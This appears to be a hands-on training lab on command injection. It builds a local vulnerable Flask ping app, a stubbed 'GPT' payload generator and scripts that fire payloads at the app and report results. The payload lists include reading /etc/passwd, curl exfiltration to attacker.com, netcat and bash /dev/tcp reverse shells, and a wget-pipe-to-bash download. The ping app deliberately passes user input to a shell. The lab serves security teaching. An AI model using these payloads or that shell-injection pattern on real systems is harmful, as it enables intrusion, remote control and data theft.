@@ -1,0 +1,359 @@
+Command Injection Scripting with GPT-Based Automation
+Learning Objectives
+By completing this lab, you will:
+
+Set up a GPT-based automation framework for security testing
+Integrate command injection scripts with AI-powered automation
+Automate command injection attack execution and analysis
+Understand the intersection of AI and cybersecurity testing
+Prerequisites
+Basic Linux command line knowledge
+Understanding of web application vulnerabilities
+Familiarity with Python programming
+Knowledge of HTTP requests and responses
+Basic understanding of command injection attacks
+Lab Environment
+Al Nafi provides Linux-based cloud machines for this lab. Click Start Lab to access your dedicated Linux machine. The provided machine is bare metal with no pre-installed tools, so you will install all required tools during the lab.
+
+Task 1: Set up GPT-Based Automation Framework
+Subtask 1.1: Install Required Dependencies
+Update the system and install Python dependencies:
+
+sudo apt update && sudo apt upgrade -y
+sudo apt install python3 python3-pip curl git -y
+pip3 install openai requests beautifulsoup4 argparse json5
+Subtask 1.2: Create Project Structure
+Set up the lab directory structure:
+
+mkdir ~/command-injection-lab
+cd ~/command-injection-lab
+mkdir scripts payloads logs results
+Subtask 1.3: Configure GPT Integration
+Create the main automation framework:
+
+nano gpt_automation.py
+Add the following code:
+
+import openai
+import requests
+import json
+import time
+from datetime import datetime
+
+class GPTCommandInjectionFramework:
+    def __init__(self, api_key=None):
+        # Using a local GPT alternative for educational purposes
+        self.base_url = "http://localhost:1234/v1"
+        self.headers = {"Content-Type": "application/json"}
+        
+    def generate_payload(self, target_info, injection_type="basic"):
+        prompt = f"""
+        Generate command injection payloads for testing purposes only.
+        Target info: {target_info}
+        Injection type: {injection_type}
+        
+        Provide 5 different payload variations in JSON format:
+        {{"payloads": ["payload1", "payload2", ...]}}
+        """
+        
+        # Simulate GPT response for educational purposes
+        payloads = {
+            "basic": [
+                "; ls -la",
+                "| whoami",
+                "&& cat /etc/passwd",
+                "; id",
+                "| ps aux"
+            ],
+            "advanced": [
+                "; curl http://attacker.com/$(whoami)",
+                "| nc -e /bin/bash attacker.com 4444",
+                "&& python3 -c 'import os; os.system(\"id\")'",
+                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+                "| wget -O- http://attacker.com/script.sh | bash"
+            ]
+        }
+        
+        return payloads.get(injection_type, payloads["basic"])
+    
+    def analyze_response(self, response_text):
+        indicators = [
+            "root:", "uid=", "gid=", "/bin/bash", "/home/",
+            "total ", "drwx", "-rw-", "Permission denied"
+        ]
+        
+        found_indicators = []
+        for indicator in indicators:
+            if indicator in response_text:
+                found_indicators.append(indicator)
+        
+        return {
+            "vulnerable": len(found_indicators) > 0,
+            "indicators": found_indicators,
+            "confidence": min(len(found_indicators) * 20, 100)
+        }
+
+if __name__ == "__main__":
+    framework = GPTCommandInjectionFramework()
+    print("GPT Command Injection Framework initialized successfully")
+Task 2: Integrate Command Injection Scripts
+Subtask 2.1: Create Vulnerable Test Application
+Set up a local vulnerable web application for testing:
+
+nano vulnerable_app.py
+from flask import Flask, request, render_template_string
+import subprocess
+import os
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return '''
+    <html>
+    <body>
+        <h2>Ping Utility (Vulnerable for Testing)</h2>
+        <form method="POST" action="/ping">
+            <input type="text" name="host" placeholder="Enter IP or hostname">
+            <input type="submit" value="Ping">
+        </form>
+    </body>
+    </html>
+    '''
+
+@app.route('/ping', methods=['POST'])
+def ping():
+    host = request.form.get('host', '')
+    # Vulnerable command execution
+    try:
+        result = subprocess.check_output(f"ping -c 3 {host}", shell=True, text=True)
+        return f"<pre>{result}</pre>"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, debug=True)
+Install Flask and start the vulnerable application:
+
+pip3 install flask
+python3 vulnerable_app.py &
+sleep 3
+Subtask 2.2: Create Command Injection Testing Script
+nano injection_tester.py
+import requests
+import urllib.parse
+from gpt_automation import GPTCommandInjectionFramework
+import json
+import time
+
+class CommandInjectionTester:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.gpt_framework = GPTCommandInjectionFramework()
+        self.session = requests.Session()
+        
+    def test_injection(self, payload, parameter="host"):
+        data = {parameter: payload}
+        
+        try:
+            response = self.session.post(
+                f"{self.target_url}/ping",
+                data=data,
+                timeout=10
+            )
+            
+            return {
+                "status_code": response.status_code,
+                "response_text": response.text,
+                "payload": payload,
+                "timestamp": time.time()
+            }
+        except Exception as e:
+            return {
+                "error": str(e),
+                "payload": payload,
+                "timestamp": time.time()
+            }
+    
+    def run_automated_test(self, injection_types=["basic", "advanced"]):
+        results = []
+        
+        for injection_type in injection_types:
+            print(f"Testing {injection_type} payloads...")
+            payloads = self.gpt_framework.generate_payload(
+                target_info=self.target_url,
+                injection_type=injection_type
+            )
+            
+            for payload in payloads:
+                print(f"Testing payload: {payload[:50]}...")
+                test_payload = f"127.0.0.1{payload}"
+                
+                result = self.test_injection(test_payload)
+                
+                if "response_text" in result:
+                    analysis = self.gpt_framework.analyze_response(result["response_text"])
+                    result["analysis"] = analysis
+                
+                results.append(result)
+                time.sleep(1)  # Rate limiting
+        
+        return results
+
+if __name__ == "__main__":
+    tester = CommandInjectionTester("http://localhost:8080")
+    results = tester.run_automated_test()
+    
+    with open("results/test_results.json", "w") as f:
+        json.dump(results, f, indent=2)
+    
+    print(f"Testing completed. Results saved to results/test_results.json")
+Task 3: Automate Attack Execution
+Subtask 3.1: Create Comprehensive Automation Script
+nano automated_injection.py
+#!/usr/bin/env python3
+import argparse
+import json
+import time
+from datetime import datetime
+from injection_tester import CommandInjectionTester
+from gpt_automation import GPTCommandInjectionFramework
+
+class AutomatedInjectionSuite:
+    def __init__(self, target_url, output_dir="results"):
+        self.target_url = target_url
+        self.output_dir = output_dir
+        self.tester = CommandInjectionTester(target_url)
+        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+    def generate_report(self, results):
+        vulnerable_tests = [r for r in results if r.get("analysis", {}).get("vulnerable", False)]
+        
+        report = {
+            "scan_info": {
+                "target": self.target_url,
+                "timestamp": self.timestamp,
+                "total_tests": len(results),
+                "vulnerable_tests": len(vulnerable_tests)
+            },
+            "summary": {
+                "vulnerability_found": len(vulnerable_tests) > 0,
+                "risk_level": "HIGH" if len(vulnerable_tests) > 3 else "MEDIUM" if len(vulnerable_tests) > 0 else "LOW"
+            },
+            "detailed_results": results,
+            "recommendations": [
+                "Implement input validation and sanitization",
+                "Use parameterized queries and safe APIs",
+                "Apply principle of least privilege",
+                "Regular security testing and code review"
+            ]
+        }
+        
+        return report
+    
+    def run_full_automation(self):
+        print(f"Starting automated command injection testing on {self.target_url}")
+        print("=" * 60)
+        
+        # Run tests
+        results = self.tester.run_automated_test(["basic", "advanced"])
+        
+        # Generate report
+        report = self.generate_report(results)
+        
+        # Save results
+        report_file = f"{self.output_dir}/automated_report_{self.timestamp}.json"
+        with open(report_file, "w") as f:
+            json.dump(report, f, indent=2)
+        
+        # Print summary
+        print("\n" + "=" * 60)
+        print("AUTOMATION COMPLETE")
+        print("=" * 60)
+        print(f"Target: {self.target_url}")
+        print(f"Total Tests: {report['scan_info']['total_tests']}")
+        print(f"Vulnerable Tests: {report['scan_info']['vulnerable_tests']}")
+        print(f"Risk Level: {report['summary']['risk_level']}")
+        print(f"Report saved: {report_file}")
+        
+        return report
+
+def main():
+    parser = argparse.ArgumentParser(description="Automated Command Injection Testing Suite")
+    parser.add_argument("--target", default="http://localhost:8080", help="Target URL")
+    parser.add_argument("--output", default="results", help="Output directory")
+    
+    args = parser.parse_args()
+    
+    suite = AutomatedInjectionSuite(args.target, args.output)
+    report = suite.run_full_automation()
+
+if __name__ == "__main__":
+    main()
+Subtask 3.2: Execute Automated Testing
+Make the script executable and run the automation:
+
+chmod +x automated_injection.py
+python3 automated_injection.py --target http://localhost:8080
+Subtask 3.3: Analyze Results
+View the generated report:
+
+ls -la results/
+cat results/automated_report_*.json | python3 -m json.tool | head -50
+Create a summary script:
+
+nano analyze_results.py
+import json
+import glob
+import sys
+
+def analyze_latest_report():
+    report_files = glob.glob("results/automated_report_*.json")
+    if not report_files:
+        print("No report files found")
+        return
+    
+    latest_report = max(report_files)
+    
+    with open(latest_report, 'r') as f:
+        report = json.load(f)
+    
+    print("COMMAND INJECTION ANALYSIS SUMMARY")
+    print("=" * 50)
+    print(f"Target: {report['scan_info']['target']}")
+    print(f"Scan Time: {report['scan_info']['timestamp']}")
+    print(f"Total Tests: {report['scan_info']['total_tests']}")
+    print(f"Vulnerable Tests: {report['scan_info']['vulnerable_tests']}")
+    print(f"Risk Level: {report['summary']['risk_level']}")
+    
+    if report['summary']['vulnerability_found']:
+        print("\nVULNERABLE PAYLOADS DETECTED:")
+        print("-" * 30)
+        for result in report['detailed_results']:
+            if result.get('analysis', {}).get('vulnerable', False):
+                payload = result.get('payload', 'Unknown')
+                confidence = result.get('analysis', {}).get('confidence', 0)
+                print(f"• {payload[:60]}... (Confidence: {confidence}%)")
+    
+    print(f"\nFull report: {latest_report}")
+
+if __name__ == "__main__":
+    analyze_latest_report()
+Run the analysis:
+
+python3 analyze_results.py
+Subtask 3.4: Clean Up and Verification
+Stop the vulnerable application and verify all components:
+
+pkill -f vulnerable_app.py
+ls -la ~/command-injection-lab/
+echo "Lab components verified successfully"
+Conclusion
+You have successfully completed Lab 7 on Command Injection Scripting with GPT-Based Automation. In this lab, you:
+
+Set up a GPT-based automation framework that can generate and analyze command injection payloads
+Integrated command injection scripts with AI-powered testing capabilities
+Automated attack execution with comprehensive reporting and analysis
+This lab demonstrates how modern AI technologies can be leveraged for security testing and vulnerability assessment. The automation framework you built can generate contextual payloads, execute tests systematically, and provide detailed analysis of results. Understanding these techniques is crucial for cybersecurity professionals who need to stay ahead of both automated attacks and automated defense mechanisms.
+
+Key takeaways: AI-powered security testing tools are becoming increasingly sophisticated, making it essential for security professionals to understand both their capabilities and limitations. Always ensure such tools are used ethically and within authorized testing environments.
